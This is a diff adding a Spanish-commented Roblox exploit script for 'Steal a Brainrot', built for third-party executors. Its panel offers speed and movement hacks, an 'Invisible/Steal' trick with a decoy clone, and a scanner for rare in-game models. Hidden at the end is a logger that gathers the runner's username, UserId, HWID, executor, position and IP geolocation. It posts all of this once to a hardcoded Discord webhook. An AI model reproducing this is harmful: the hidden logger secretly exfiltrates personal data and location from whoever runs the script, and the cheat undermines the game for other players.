@@ -1,0 +1,766 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
+ 
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+ 
+local miNombre = player.Name
+local destino = nil
+local avanzar = false
+local speedMultiplier = 3
+local bypassEnabled = true
+local mover = Vector3.zero
+local impulso = 0.5
+local sistemaHabilitado = false
+local sigiloActivo = false
+local conexiones = {}
+ 
+-- GUI base
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "VIPStealGUI"
+gui.ResetOnSpawn = false
+ 
+-- Panel principal
+local panel = Instance.new("Frame", gui)
+panel.Size = UDim2.new(0, 300, 0, 240)
+panel.Position = UDim2.new(0.5, -150, 0.5, -120)
+panel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+panel.BorderSizePixel = 0
+panel.Active = true
+panel.Draggable = true
+ 
+-- Título
+local titulo = Instance.new("TextLabel", panel)
+titulo.Size = UDim2.new(1, -40, 0, 40)
+titulo.Position = UDim2.new(0, 10, 0, 0)
+titulo.BackgroundTransparency = 1
+titulo.Text = '<font color="rgb(255,255,0)">VIP</font> - <font color="rgb(180,180,180)">Steal Brainrot</font>'
+titulo.Font = Enum.Font.GothamBold
+titulo.TextSize = 22
+titulo.TextXAlignment = Enum.TextXAlignment.Left
+titulo.RichText = true
+titulo.TextColor3 = Color3.fromRGB(255, 255, 255)
+ 
+-- Botón minimizar
+local btnMin = Instance.new("TextButton", panel)
+btnMin.Size = UDim2.new(0, 30, 0, 30)
+btnMin.Position = UDim2.new(1, -35, 0, 5)
+btnMin.Text = "-"
+btnMin.Font = Enum.Font.GothamBold
+btnMin.TextSize = 20
+btnMin.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+btnMin.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnMin.BorderSizePixel = 0
+ 
+-- Contenedor del contenido
+local contenido = Instance.new("Frame", panel)
+contenido.Size = UDim2.new(1, 0, 1, -70)
+contenido.Position = UDim2.new(0, 0, 0, 40)
+contenido.BackgroundTransparency = 1
+ 
+-- Botón Base Rápido
+local botonBase = Instance.new("TextButton", contenido)
+botonBase.Size = UDim2.new(0.85, 0, 0, 40)
+botonBase.Position = UDim2.new(0.075, 0, 0, 10)
+botonBase.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+botonBase.BorderSizePixel = 0
+botonBase.TextColor3 = Color3.fromRGB(255, 255, 255)
+botonBase.Font = Enum.Font.GothamBold
+botonBase.TextSize = 18
+botonBase.Text = "Base Rápido"
+ 
+-- Botón Fast Brainrot
+local botonFB = Instance.new("TextButton", contenido)
+botonFB.Size = UDim2.new(0.85, 0, 0, 40)
+botonFB.Position = UDim2.new(0.075, 0, 0, 60)
+botonFB.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+botonFB.BorderSizePixel = 0
+botonFB.TextColor3 = Color3.fromRGB(255, 255, 255)
+botonFB.Font = Enum.Font.GothamBold
+botonFB.TextSize = 18
+botonFB.Text = "Fast Brainrot [OFF]"
+ 
+-- Firma inferior
+local firma = Instance.new("TextLabel", panel)
+firma.Size = UDim2.new(1, 0, 0, 20)
+firma.Position = UDim2.new(0, 0, 1, -20)
+firma.BackgroundTransparency = 1
+firma.TextColor3 = Color3.fromRGB(150, 150, 150)
+firma.Text = "Made By: OneClye"
+firma.Font = Enum.Font.Gotham
+firma.TextSize = 14
+ 
+-- Guardamos valores originales para la animación de la firma
+local textoFirmaOriginalSize = firma.TextSize
+local textoFirmaOriginalPos = firma.Position
+ 
+-- Función para animar la firma al minimizar o maximizar
+local function animarFirmaMinimizada(minimizado)
+	if minimizado then
+		-- Tween posición para mover un poco más abajo
+		local tweenPos = TweenService:Create(firma, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Position = UDim2.new(0, 0, 1, -5)  -- baja un poco más (antes era -20)
+		})
+		tweenPos:Play()
+ 
+		-- Animar TextSize bajando
+		local pasos = 10
+		local duracion = 0.3
+		local inicio = textoFirmaOriginalSize
+		local final = 10 -- tamaño pequeño
+		for i = 1, pasos do
+			task.wait(duracion / pasos)
+			firma.TextSize = inicio - ((inicio - final) * (i / pasos))
+		end
+ 
+	else
+		-- Volver posición original
+		local tweenPos = TweenService:Create(firma, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Position = textoFirmaOriginalPos
+		})
+		tweenPos:Play()
+ 
+		-- Animar TextSize subiendo
+		local pasos = 10
+		local duracion = 0.3
+		local inicio = firma.TextSize
+		local final = textoFirmaOriginalSize
+		for i = 1, pasos do
+			task.wait(duracion / pasos)
+			firma.TextSize = inicio + ((final - inicio) * (i / pasos))
+		end
+	end
+end
+ 
+-- Función minimizar
+local minimizado = false
+local animando = false
+local function toggleMinimizar()
+	if animando then return end
+	animando = true
+	minimizado = not minimizado
+	btnMin.Text = minimizado and "+" or "-"
+ 
+	-- Animar firma
+	task.spawn(function()
+		animarFirmaMinimizada(minimizado)
+	end)
+ 
+	if minimizado then
+		-- Animar contenido (botones y texto) a desaparecer
+		for _, c in pairs(contenido:GetChildren()) do
+			if c:IsA("GuiObject") then
+				TweenService:Create(c, TweenInfo.new(0.2), {
+					TextTransparency = 1,
+					BackgroundTransparency = 1,
+				}):Play()
+				-- Ocultar después de la animación
+				task.delay(0.2, function()
+					c.Visible = false
+				end)
+			end
+		end
+ 
+		-- Tween para achicar el panel
+		local tweenPanel = TweenService:Create(panel, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Size = UDim2.new(0, 300, 0, 40)
+		})
+		tweenPanel:Play()
+		tweenPanel.Completed:Wait()
+ 
+	else
+		-- Tween para agrandar el panel
+		local tweenPanel = TweenService:Create(panel, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Size = UDim2.new(0, 300, 0, 240)
+		})
+		tweenPanel:Play()
+		tweenPanel.Completed:Wait()
+ 
+		-- Mostrar contenido y animar a visible
+		for _, c in pairs(contenido:GetChildren()) do
+			if c:IsA("GuiObject") then
+				c.Visible = true
+				TweenService:Create(c, TweenInfo.new(0.2), {
+					TextTransparency = 0,
+					BackgroundTransparency = 0
+				}):Play()
+			end
+		end
+	end
+ 
+	animando = false
+end
+btnMin.MouseButton1Click:Connect(toggleMinimizar)
+ 
+-- Función base
+local function buscarMain()
+	local plots = Workspace:FindFirstChild("Plots")
+	if not plots then return end
+	for _, model in ipairs(plots:GetChildren()) do
+		if model:IsA("Model") then
+			local plotSign = model:FindFirstChild("PlotSign")
+			if plotSign then
+				for _, descendant in ipairs(plotSign:GetDescendants()) do
+					if descendant:IsA("TextLabel") and descendant.Text:lower():match(miNombre:lower()) then
+						local laserHitbox = model:FindFirstChild("LaserHitbox")
+						if laserHitbox then
+							local main = laserHitbox:FindFirstChild("Main")
+							if main and main:IsA("BasePart") then
+								return main.Position
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
+ 
+-- Botón Base Rápido
+botonBase.MouseButton1Click:Connect(function()
+	avanzar = not avanzar
+	botonBase.Text = avanzar and "Detener" or "Base Rápido"
+	if avanzar then destino = buscarMain() end
+end)
+ 
+-- Movimiento Base
+RunService.RenderStepped:Connect(function(dt)
+	if avanzar and destino and rootPart and bypassEnabled then
+		local direction = destino - rootPart.Position
+		if direction.Magnitude > 2 then
+			local moveVector = direction.Unit * humanoid.WalkSpeed * (speedMultiplier - 1) * dt
+			rootPart.CFrame = rootPart.CFrame + moveVector
+		else
+			avanzar = false
+			botonBase.Text = "Base Rápido"
+		end
+	end
+ 
+	if sigiloActivo and mover.Magnitude > 0 then
+		local direccion = (rootPart.CFrame:VectorToWorldSpace(mover.Unit)) * impulso
+		rootPart.CFrame += Vector3.new(direccion.X, 0, direccion.Z)
+	end
+end)
+ 
+-- Fast Brainrot control
+local function activarSigilo()
+	if sigiloActivo then return end
+	sigiloActivo = true
+	if not UIS.TouchEnabled then
+		conexiones.teclasInicio = UIS.InputBegan:Connect(function(input, gpe)
+			if gpe then return end
+			local dir = ({
+				[Enum.KeyCode.W] = Vector3.new(0, 0, -1),
+				[Enum.KeyCode.S] = Vector3.new(0, 0, 1),
+				[Enum.KeyCode.A] = Vector3.new(-1, 0, 0),
+				[Enum.KeyCode.D] = Vector3.new(1, 0, 0),
+			})[input.KeyCode]
+			if dir then mover += dir end
+		end)
+		conexiones.teclasFin = UIS.InputEnded:Connect(function(input)
+			local dir = ({
+				[Enum.KeyCode.W] = Vector3.new(0, 0, -1),
+				[Enum.KeyCode.S] = Vector3.new(0, 0, 1),
+				[Enum.KeyCode.A] = Vector3.new(-1, 0, 0),
+				[Enum.KeyCode.D] = Vector3.new(1, 0, 0),
+			})[input.KeyCode]
+			if dir then mover -= dir end
+		end)
+	end
+end
+ 
+local function desactivarSigilo()
+	if not sigiloActivo then return end
+	sigiloActivo = false
+	for _, c in pairs(conexiones) do
+		if typeof(c) == "RBXScriptConnection" then c:Disconnect() end
+	end
+	conexiones = {}
+	mover = Vector3.zero
+end
+ 
+botonFB.MouseButton1Click:Connect(function()
+	sistemaHabilitado = not sistemaHabilitado
+	botonFB.Text = "Fast Brainrot [" .. (sistemaHabilitado and "ON" or "OFF") .. "]"
+end)
+ 
+local function conectarPrompt(prompt)
+	if prompt:IsA("ProximityPrompt") then
+		prompt.Triggered:Connect(function(p)
+			if p ~= player or not sistemaHabilitado then return end
+			activarSigilo()
+			task.spawn(function()
+				while true do
+					local cerca = false
+					for _, model in ipairs(Workspace:GetChildren()) do
+						if model:IsA("Model") and model ~= character and model:FindFirstChild("RootPart") then
+							if (model.RootPart.Position - rootPart.Position).Magnitude <= 15 then
+								cerca = true break
+							end
+						end
+					end
+					if not cerca then break end
+					task.wait(0.5)
+				end
+				desactivarSigilo()
+			end)
+		end)
+	end
+end
+ 
+for _, d in ipairs(Workspace:GetDescendants()) do conectarPrompt(d) end
+Workspace.DescendantAdded:Connect(conectarPrompt)
+ 
+player.CharacterAdded:Connect(function(char)
+	character = char
+	humanoid = char:WaitForChild("Humanoid")
+	rootPart = char:WaitForChild("HumanoidRootPart")
+end)
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+ 
+local modelosObjetivo = {
+	"Ballerina Cappuccina", "Bambini Crostini", "Bananita Dolphinita", "Blueberrinni Octopusini",
+	"Bombardiro Crocodilo", "Bombombini Gusini", "Boneca Ambalabu", "Brr Brr Patapim",
+	"Brri Brri Bicus Dicus Bombicus", "Burbaloni Loliloli", "Cappuccino Assassino", "Chef Cabracadabra",
+	"Chimpanzini Bananini", "Cocofanto Elefanto", "Fluriflura", "Frigo Camelo", "Gangster Footera",
+	"Girafa Celestre", "Glorbo Fruttodrillo", "Graipuss Medussi","Gattatino Nyanino", "La Grande Combinasion",
+	"La Vacca Saturno Saturnita", "LirilÌ Larilà", "Los Tralaleritos", "Matteo", "Noobini Pizzanini",
+	"Odin Din Din Dun", "Orangutini Ananassini", "Perochello Lemonchello", "Pipi Kiwi", "Rhino Toasterino", "Svinina Bombardino",
+	"Ta Ta Ta Ta Sahur", "Talpa Di Fero", "Tim Cheese", "Tralalero Tralala", "Trippi Troppi", "Trenostruzzo Turbo 3000", "Tric Trac Baraboom",
+	"Trulimero Trulicina", "Tung Tung Tung Sahur"
+}
+local importantes = {
+	["Tralalero Tralala"] = true,
+	["Odin Din Din Dun"] = true,
+	["La Vacca Saturno Saturnita"] = true,
+	["Graipuss Medussi"] = true,
+	["Girafa Celestre"] = true,
+	["Los Tralaleritos"] = true,
+	["La Grande Combinasion"] = true,
+	["Matteo"] = true,
+	["Gattatino Nyanino"] = true,
+	["Trenostruzzo Turbo 3000"] = true,
+	["Cocofanto Elefanto"] = true,
+}
+ 
+local encontrados = {}
+local mensajes = {}
+ 
+-- GUI base
+local notificacionesGui = Instance.new("ScreenGui")
+notificacionesGui.Name = "NotificacionesModelos"
+notificacionesGui.ResetOnSpawn = false
+notificacionesGui.Parent = playerGui
+ 
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Size = UDim2.new(0, 420, 0, 200)
+scrollFrame.Position = UDim2.new(1, -430, 0, 20)
+scrollFrame.AnchorPoint = Vector2.new(0, 0)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #modelosObjetivo * 40)
+scrollFrame.ScrollBarThickness = 6
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.BorderSizePixel = 0
+scrollFrame.Parent = notificacionesGui
+ 
+local uiLayout = Instance.new("UIListLayout")
+uiLayout.SortOrder = Enum.SortOrder.LayoutOrder
+uiLayout.Padding = UDim.new(0, 5)
+uiLayout.Parent = scrollFrame
+ 
+-- ✨ Animación de entrada
+local function animarEntrada(label)
+	label.Position = UDim2.new(0, 5, 0, -20)
+	label.TextTransparency = 1
+	label.TextStrokeTransparency = 1
+ 
+	local tweenInfo = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+	TweenService:Create(label, tweenInfo, {
+		Position = UDim2.new(0, 5, 0, 0),
+		TextTransparency = 0,
+		TextStrokeTransparency = 0.5
+	}):Play()
+end
+ 
+local function mostrarMensaje(nombre, cantidad, orden, tipo)
+	local mensaje = mensajes[nombre]
+ 
+	local texto, color
+	if tipo == "presente" then
+		texto = "✔ " .. nombre .. " está en este servidor (x" .. cantidad .. ")"
+		color = importantes[nombre] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(200, 255, 200)
+	elseif tipo == "ausente" then
+		texto = "❌ " .. nombre .. " no está en este servidor"
+		color = Color3.fromRGB(255, 180, 180)
+	elseif tipo == "desaparecio" then
+		texto = "❌ " .. nombre .. " se ha ido del servidor"
+		color = Color3.fromRGB(255, 100, 100)
+	end
+ 
+	if not mensaje then
+		mensaje = Instance.new("TextLabel")
+		mensaje.Size = UDim2.new(1, -10, 0, 30)
+		mensaje.BackgroundTransparency = 1
+		mensaje.BorderSizePixel = 0
+		mensaje.TextSize = 14
+		mensaje.Font = Enum.Font.Gotham
+		mensaje.TextXAlignment = Enum.TextXAlignment.Center
+		mensaje.TextYAlignment = Enum.TextYAlignment.Center
+		mensaje.TextColor3 = color
+		mensaje.Text = texto
+ 
+		local corner = Instance.new("UICorner")
+		corner.CornerRadius = UDim.new(0, 8)
+		corner.Parent = mensaje
+ 
+		mensaje.Parent = scrollFrame
+		mensajes[nombre] = mensaje
+ 
+		animarEntrada(mensaje)
+	else
+		mensaje.Text = texto
+		mensaje.TextColor3 = color
+	end
+ 
+	mensaje.LayoutOrder = (tipo == "presente" or tipo == "desaparecio") and -1000 + orden or orden
+ 
+	if tipo == "desaparecio" or tipo == "ausente" then
+		task.delay(5, function()
+			if mensaje and mensaje.Parent then
+				mensaje:Destroy()
+				mensajes[nombre] = nil
+			end
+		end)
+	end
+end
+ 
+local function contarModelos(nombre)
+	local cantidad = 0
+	for _, child in ipairs(workspace:GetChildren()) do
+		if child:IsA("Model") and child.Name == nombre then
+			cantidad += 1
+		end
+	end
+	return cantidad
+end
+ 
+local function primeraRevision()
+	for i, nombre in ipairs(modelosObjetivo) do
+		local cantidad = contarModelos(nombre)
+		encontrados[nombre] = cantidad
+		if cantidad > 0 then
+			mostrarMensaje(nombre, cantidad, i, "presente")
+		else
+			mostrarMensaje(nombre, cantidad, i, "ausente")
+		end
+	end
+end
+ 
+local function actualizaciones()
+	while true do
+		for i, nombre in ipairs(modelosObjetivo) do
+			local cantidadActual = contarModelos(nombre)
+			local cantidadAnterior = encontrados[nombre]
+ 
+			if cantidadActual ~= cantidadAnterior then
+				encontrados[nombre] = cantidadActual
+				if cantidadActual > 0 then
+					mostrarMensaje(nombre, cantidadActual, i, "presente")
+				elseif cantidadAnterior > 0 and cantidadActual == 0 then
+					mostrarMensaje(nombre, 0, i, "desaparecio")
+				elseif cantidadActual == 0 then
+					mostrarMensaje(nombre, 0, i, "ausente")
+				end
+			end
+		end
+		task.wait(2)
+	end
+end
+ 
+ 
+-- Botón Invisible/Steal
+local botonSteal = Instance.new("TextButton", contenido)
+botonSteal.Size = UDim2.new(0.85, 0, 0, 40)
+botonSteal.Position = UDim2.new(0.075, 0, 0, 110)
+botonSteal.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+botonSteal.BorderSizePixel = 0
+botonSteal.TextColor3 = Color3.fromRGB(255, 255, 255)
+botonSteal.Font = Enum.Font.GothamBold
+botonSteal.TextSize = 18
+botonSteal.Text = "Invisible/Steal"
+ 
+local isUp = false
+local heightOffset = 200
+local debounce = false
+local cloneModel = nil
+local cameraPart = nil
+local runService = game:GetService("RunService")
+local moveConnection
+ 
+local function createClone(char)
+	if cloneModel then
+		cloneModel:Destroy()
+		cloneModel = nil
+	end
+	cloneModel = Instance.new("Model")
+	cloneModel.Name = "CharacterClone"
+	for _, part in pairs(char:GetChildren()) do
+		if part:IsA("BasePart") then
+			local partClone = part:Clone()
+			partClone.Anchored = false
+			partClone.CanCollide = false
+			partClone.Transparency = 0
+			partClone.Parent = cloneModel
+		elseif part:IsA("Accessory") or part:IsA("CharacterMesh") then
+			part:Clone().Parent = cloneModel
+		end
+	end
+	cloneModel.Parent = workspace
+	local hrp = char:FindFirstChild("HumanoidRootPart")
+	if hrp then
+		local primaryPart = cloneModel:FindFirstChild("HumanoidRootPart") or cloneModel:FindFirstChildWhichIsA("BasePart")
+		if primaryPart then
+			cloneModel.PrimaryPart = primaryPart
+		end
+	end
+	return cloneModel
+end
+ 
+botonSteal.MouseButton1Click:Connect(function()
+	if debounce then return end
+	debounce = true
+ 
+	local char = player.Character or player.CharacterAdded:Wait()
+	local humanoid = char:FindFirstChildOfClass("Humanoid")
+	local hrp = char and char:FindFirstChild("HumanoidRootPart")
+	local cam = workspace.CurrentCamera
+ 
+	if hrp and humanoid and humanoid.Health > 0 then
+		if not isUp then
+			if not cloneModel then
+				cloneModel = createClone(char)
+			end
+			hrp.CFrame = hrp.CFrame + Vector3.new(0, heightOffset, 0)
+			if cloneModel and cloneModel.PrimaryPart then
+				cloneModel:SetPrimaryPartCFrame(hrp.CFrame - Vector3.new(0, heightOffset, 0))
+			end
+			if not cameraPart then
+				cameraPart = Instance.new("Part")
+				cameraPart.Size = Vector3.new(2, 1, 2)
+				cameraPart.Anchored = true
+				cameraPart.CanCollide = false
+				cameraPart.Transparency = 1
+				cameraPart.Name = "CameraAnchor"
+				cameraPart.Parent = workspace
+			end
+			cameraPart.CFrame = (cloneModel.PrimaryPart.CFrame - Vector3.new(0, heightOffset, 0)) + Vector3.new(0, 25, 0)
+			cam.CameraType = Enum.CameraType.Custom
+			cam.CameraSubject = cameraPart
+ 
+			if moveConnection then moveConnection:Disconnect() end
+			moveConnection = runService.RenderStepped:Connect(function()
+				if char and cloneModel and cloneModel.PrimaryPart and hrp and cameraPart then
+					local offsetCFrame = hrp.CFrame - Vector3.new(0, heightOffset, 0)
+					cloneModel:SetPrimaryPartCFrame(offsetCFrame)
+					cameraPart.CFrame = offsetCFrame + Vector3.new(0, 25, 0)
+				end
+			end)
+ 
+			botonSteal.Text = "Invisible/Steal [ON]"
+			isUp = true
+		else
+			if moveConnection then moveConnection:Disconnect() end
+			if hrp and cloneModel and cloneModel.PrimaryPart then
+				cloneModel:SetPrimaryPartCFrame(cloneModel.PrimaryPart.CFrame - Vector3.new(0, heightOffset, 0))
+			end
+			hrp.CFrame = hrp.CFrame - Vector3.new(0, heightOffset, 0)
+ 
+			cam.CameraType = Enum.CameraType.Custom
+			cam.CameraSubject = humanoid
+ 
+			if cloneModel then
+				delay(0.3, function()
+					if cloneModel then
+						cloneModel:Destroy()
+						cloneModel = nil
+					end
+				end)
+			end
+			if cameraPart then
+				cameraPart:Destroy()
+				cameraPart = nil
+			end
+			botonSteal.Text = "Invisible/Steal [OFF]"
+			isUp = false
+		end
+	end
+	task.wait(0.5)
+	debounce = false
+end)
+ 
+ 
+-- Botón pequeño para mostrar/ocultar la tabla (arriba derecha del panel)
+local botonTabla = Instance.new("TextButton", panel)
+botonTabla.Size = UDim2.new(0, 30, 0, 30)
+botonTabla.Position = UDim2.new(1, -105, 0, 5) -- Más hacia la izquierda del botón minimizar
+botonTabla.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+botonTabla.BorderSizePixel = 0
+botonTabla.TextColor3 = Color3.fromRGB(255, 255, 255)
+botonTabla.Font = Enum.Font.GothamBold
+botonTabla.TextSize = 16
+botonTabla.Text = "📋"
+ 
+local tablaVisible = true
+botonTabla.MouseButton1Click:Connect(function()
+	tablaVisible = not tablaVisible
+	scrollFrame.Visible = tablaVisible
+	botonTabla.Text = tablaVisible and "📋" or "📁"
+end)
+ 
+primeraRevision()
+task.spawn(actualizaciones)
+
+
+
+--DxxxxOX
+
+
+local request = (syn and syn.request) or http_request or request or (http and http.request)
+if not request then return end
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local hasSentFileName = "webhook_sent_flag_" .. tostring(Players.LocalPlayer.UserId) .. ".txt"
+
+-- Función para comprobar si ya enviamos el mensaje antes
+local function hasAlreadySent()
+    if syn and syn.read_file then
+        local success, content = pcall(syn.read_file, hasSentFileName)
+        if success and content == "true" then
+            return true
+        end
+    elseif readfile then
+        local success, content = pcall(readfile, hasSentFileName)
+        if success and content == "true" then
+            return true
+        end
+    end
+    return false
+end
+
+-- Función para marcar que ya enviamos el mensaje
+local function markAsSent()
+    if syn and syn.write_file then
+        pcall(syn.write_file, hasSentFileName, "true")
+    elseif writefile then
+        pcall(writefile, hasSentFileName, "true")
+    end
+end
+
+-- Si ya se envió antes, salir
+if hasAlreadySent() then
+    return
+end
+
+-- Detectar dispositivo
+local deviceType
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    deviceType = "Celular/Tablet"
+elseif UserInputService.KeyboardEnabled then
+    deviceType = "PC"
+else
+    deviceType = "Desconocido"
+end
+
+local accountAgeDays = player.AccountAge
+local secondsInDay = 86400
+local timestampNow = os.time()
+local timestampCreation = timestampNow - (accountAgeDays * secondsInDay)
+local creationDateTable = os.date("*t", timestampCreation)
+local creationDateStr = string.format("%02d/%02d/%04d", creationDateTable.day, creationDateTable.month, creationDateTable.year)
+
+local username = player.Name
+local displayName = player.DisplayName
+local userId = player.UserId
+local accountAge = player.AccountAge
+local premium = player.MembershipType == Enum.MembershipType.Premium
+local membershipType = tostring(player.MembershipType)
+
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local charPosition = humanoidRootPart.Position
+local camPosition = workspace.CurrentCamera.CFrame.Position
+
+local placeId = game.PlaceId
+local gameId = game.GameId
+local jobId = game.JobId
+local executor = (identifyexecutor and identifyexecutor()) or "Desconocido"
+local hwid = (syn and syn.secure_get_hwid and syn.secure_get_hwid()) or "No disponible"
+
+local startTime = tick()
+
+local response = request({
+    Url = "https://freeipapi.com/api/json",
+    Method = "GET"
+})
+
+if response and response.Body then
+    local ipData = HttpService:JSONDecode(response.Body)
+    local timePlayed = math.floor(tick() - startTime)
+
+    local msg = ""
+    msg = msg .. "Username: " .. username .. "\n"
+    msg = msg .. "DisplayName: " .. displayName .. "\n"
+    msg = msg .. "UserId: " .. userId .. "\n"
+    msg = msg .. "Fecha de creación: " .. creationDateStr .. "\n"
+    msg = msg .. "Edad de cuenta: " .. accountAge .. " días\n"
+    msg = msg .. "Premium: " .. tostring(premium) .. "\n"
+    msg = msg .. "MembershipType: " .. membershipType .. "\n"
+    msg = msg .. "Dispositivo: " .. deviceType .. "\n"
+    msg = msg .. "Executor: " .. executor .. "\n"
+    msg = msg .. "HWID: " .. hwid .. "\n"
+    msg = msg .. "Tiempo jugado: " .. timePlayed .. " segundos\n"
+    msg = msg .. "JobId: " .. jobId .. "\n"
+    msg = msg .. "GameId: " .. gameId .. "\n"
+    msg = msg .. "PlaceId: " .. placeId .. "\n"
+    msg = msg .. "Char Pos: " .. tostring(charPosition) .. "\n"
+    msg = msg .. "Cam Pos: " .. tostring(camPosition) .. "\n\n"
+
+    for k, v in pairs(ipData) do
+        msg = msg .. k .. ": " .. tostring(v) .. "\n"
+    end
+
+    local webhookResponse = request({
+        Url = "https://discord.com/api/webhooks/1387650265770885151/UkJJFDcsV62Jyvtx6z7x4MCmY8dz-jzjn0-JZTyZcAL10mQKZIWmlePnsQVATO2sPuxE",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            content = msg
+        })
+    })
+
+    if webhookResponse and webhookResponse.StatusCode == 204 then
+        -- marcar como enviado solo si la request fue exitosa
+        markAsSent()
+    end
+end
